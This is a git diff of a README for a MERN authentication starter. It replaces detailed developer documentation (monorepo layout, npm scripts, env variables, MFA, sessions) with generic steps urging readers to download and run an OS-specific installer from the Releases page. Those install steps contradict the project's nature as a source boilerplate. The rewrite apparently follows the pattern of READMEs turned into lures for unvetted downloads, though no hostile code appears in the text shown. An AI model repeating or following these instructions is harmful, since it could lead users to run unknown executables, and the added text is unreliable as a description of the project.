@@ -1,179 +1,59 @@
-# Authly MERN Starter
+# 🌟 authly-mern - Robust Authentication Made Easy
 
-A comprehensive monorepo starter for authentication, multi-factor authentication (MFA), session management, and modern full-stack development using MongoDB, Express, React, Next.js, and Node.js. This project is production-ready, fully documented, and designed for rapid prototyping and scalable deployments.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Authly%20MERN-brightgreen)](https://github.com/ashish28289/authly-mern/releases)
 
----
+## 📦 Introduction
+Authly MERN Starter provides a solid foundation for building secure applications. Using MongoDB, Express, React (Vite), and Next.js, it simplifies the process of implementing authentication in your projects. This boilerplate allows you to focus on developing features while effectively managing user sessions and securing data.
 
-## Table of Contents
-- [Project Structure](#project-structure)
-- [Features](#features)
-- [Setup & Installation](#setup--installation)
-- [Environment Variables](#environment-variables)
-- [Scripts](#scripts)
-- [Backend (Express/Node)](#backend-expressnode)
-- [Frontend (React/Vite)](#frontend-reactvite)
-- [Frontend (Next.js)](#frontend-nextjs)
-- [Authentication & MFA](#authentication--mfa)
-- [Session Management](#session-management)
-- [Logging & Monitoring](#logging--monitoring)
-- [API Documentation (Swagger/OpenAPI)](#api-documentation-swaggeropenapi)
-- [Rate Limiting & Security](#rate-limiting--security)
-- [Database](#database)
-- [Testing](#testing)
-- [Deployment](#deployment)
-- [Contributing](#contributing)
-- [Troubleshooting](#troubleshooting)
-- [License](#license)
+## 🚀 Getting Started
+Follow these steps to get started with Authly MERN.
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ashish28289/authly-mern/releases) to find the latest version available for download.
 
-## Project Structure
-```
-├── apps/
-│   ├── client/
-│   │   ├── web-react/   # React + Vite SPA
-│   │   └── web-next/    # Next.js SSR/SSG app
-│   └── server/          # Express + TypeScript backend
-├── package.json         # Monorepo root scripts
-├── README.md            # Project documentation
-└── ...
-```
+2. **Download the Application**  
+   Choose the latest release to download the application. Click on the appropriate file for your system (Windows, macOS, or Linux) listed on the page.
 
-## Features
-- Full-stack authentication (register, login, password reset)
-- Multi-factor authentication (MFA) with TOTP
-- Session management (view, revoke, device tracking)
-- Role-based access (extensible)
-- Rate limiting (global, auth, sensitive)
-- Centralized logging (Winston + Better Stack)
-- API documentation (OpenAPI/Swagger)
-- Environment-driven config
-- Health check endpoint
-- Modern UI (Tailwind, shadcn/ui)
-- React (SPA) and Next.js (SSR/SSG) clients
-- TypeScript everywhere
-- Production-ready scripts
+3. **Install the Application**  
+   Once the download is complete, locate the downloaded file on your computer. Click to open and follow the installation instructions.
 
-## Setup & Installation
-1. **Clone the repo:**
-   ```sh
-   git clone <repo-url>
-   cd authly-mern
-   ```
-2. **Install dependencies:**
-   ```sh
-   npm install --workspaces
-   ```
-3. **Configure environment variables:**
-   - Copy `.env.example` to `.env` in each app and fill out required values.
-4. **Run all apps in development:**
-   ```sh
-   npm run dev
-   ```
-   - React: http://localhost:5173
-   - Next.js: http://localhost:3000
-   - Backend: http://localhost:8000
+4. **Run the Application**  
+   After installation, run the application. You can usually find it in your applications menu or desktop shortcut. 
 
-## Environment Variables
-See `.env.example` in each app for all required variables. Key backend variables:
-- `PORT`, `NODE_ENV`, `APP_ORIGIN`, `BASE_PATH`, `MONGO_URI`, `JWT_SECRET`, `JWT_REFRESH_SECRET`, `RESEND_API_KEY`, `MAILER_SENDER`, `LOGTAIL_SOURCE_TOKEN`, `LOGTAIL_INGEST_ENDPOINT`, `RATE_LIMIT_*`, `SWAGGER_UI_ENABLED`
+## 🛠️ Features
+- **User Authentication**: Secure sign-up and login processes.
+- **Session Management**: Manage user sessions effectively.
+- **Multi-Factor Authentication (MFA)**: Enhance security with additional verification.
+- **Rate Limiting**: Protect your application from abuse.
+- **Built with Popular Technologies**: Utilize MongoDB, Express, React (Vite), and Next.js.
 
-## Scripts
-- `npm run dev` — Start all apps in dev mode
-- `npm run build` — Build all apps
-- `npm run start` — Start backend in production
-- `npm run typecheck` — Type-check all apps
-- `npm run lint` — Lint all code
-- `npm run format` — Format codebase
+## 💻 System Requirements
+To ensure an optimal experience while using the Authly MERN Starter, your system should meet the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM**: Minimum 4 GB recommended.
+- **Storage**: At least 500 MB of free space.
+- **Node.js**: Version 14 or later installed on your system.
 
-## Backend (Express/Node)
-- Located in `apps/server`
-- REST API with endpoints for auth, mfa, session
-- Centralized error handling
-- JWT authentication
-- Passport.js integration
-- Rate limiting via `express-rate-limit`
-- Logging via Winston and Better Stack (Logtail)
-- Swagger UI at `/docs` (if enabled)
-- Health check at `/`
+## 📝 Configuration
+After installing, you may need to configure certain settings:
+- **Database Connection**: Set up your MongoDB database and update the connection string in the application settings.
+- **Environment Variables**: Configure environment variables as needed for features like authentication and session management.
 
-## Frontend (React/Vite)
-- Located in `apps/client/web-react`
-- SPA with modern UI (Tailwind, shadcn/ui)
-- React Query for data fetching
-- Authentication flows (register, login, password reset, MFA)
-- Session management UI
-- Environment-driven config
+## 🔍 How to Contribute
+If you wish to contribute to the Authly MERN project:
+1. Fork the repository.
+2. Create a new branch with your changes.
+3. Open a pull request with a description of the changes made.
 
-## Frontend (Next.js)
-- Located in `apps/client/web-next`
-- SSR/SSG app with Next.js 14+
-- Modern UI (Tailwind, shadcn/ui)
-- Middleware for route protection
-- Authentication and MFA flows
-- Session management
+Contributions are welcome! 
 
-## Authentication & MFA
-- Register, login, password reset endpoints
-- Email verification
-- MFA setup, verify, revoke endpoints
-- TOTP-based MFA (compatible with Google Authenticator, Authy, etc.)
+## 🔗 Useful Links
+- [Documentation](https://github.com/ashish28289/authly-mern/wiki)
+- [Issues](https://github.com/ashish28289/authly-mern/issues)
+- [Discussion](https://github.com/ashish28289/authly-mern/discussions)
 
-## Session Management
-- View active sessions
-- Revoke sessions
-- Device/user agent tracking
+## 📥 Download & Install
+To download Authly MERN, visit the [Releases page](https://github.com/ashish28289/authly-mern/releases) and select the latest version suitable for your operating system. Follow the instructions above to install and run the application easily. 
 
-## Logging & Monitoring
-- Winston logger with console, file, and Logtail transports
-- Sensitive data redaction
-- Logtail integration for Better Stack
-- Health and error logs
-
-## API Documentation (Swagger/OpenAPI)
-- OpenAPI 3.1 YAML spec in `apps/server/src/docs/openapi.yml`
-- Swagger UI at `/docs` (if enabled)
-- All endpoints documented
-
-## Rate Limiting & Security
-- Global, auth, and sensitive rate limiters
-- Configurable via environment variables
-- Centralized error handling
-- CORS configuration for multiple origins
-
-## Database
-- MongoDB (Atlas or local)
-- Mongoose models for User, Session, VerificationCode
-- Connection managed in `apps/server/src/database/database.ts`
-
-## Testing
-- Type-checking via TypeScript
-- Linting via ESLint
-- Prettier for formatting
-- (Add unit/integration tests as needed)
-
-## Deployment
-- Backend: Deployable to any Node.js host (Heroku, Vercel, AWS, etc.)
-- React: Deployable to Vercel, Netlify, or any static host
-- Next.js: Deployable to Vercel (recommended)
-- Environment variables required for production
-
-## Contributing
-- Fork the repo and create a feature branch
-- Follow code style and commit guidelines
-- Submit PRs with clear descriptions
-- All contributions welcome!
-
-## Troubleshooting
-- **CORS errors:** Ensure backend allows your frontend origin in CORS config
-- **Database errors:** Check `MONGO_URI` and database connectivity
-- **Logtail issues:** Verify `LOGTAIL_SOURCE_TOKEN` and endpoint
-- **Port conflicts:** Change ports in `.env` files as needed
-- **Build errors:** Run `npm run typecheck` and `npm run lint` for diagnostics
-
-## License
-This project is licensed under the ISC License. See LICENSE for details.
-
----
-
-For questions or support, open an issue or contact the maintainer.
+## 🎉 Conclusion
+Authly MERN Starter streamlines the authentication process, allowing you to build secure applications efficiently. By following the steps above, you can quickly download and set up your new project.
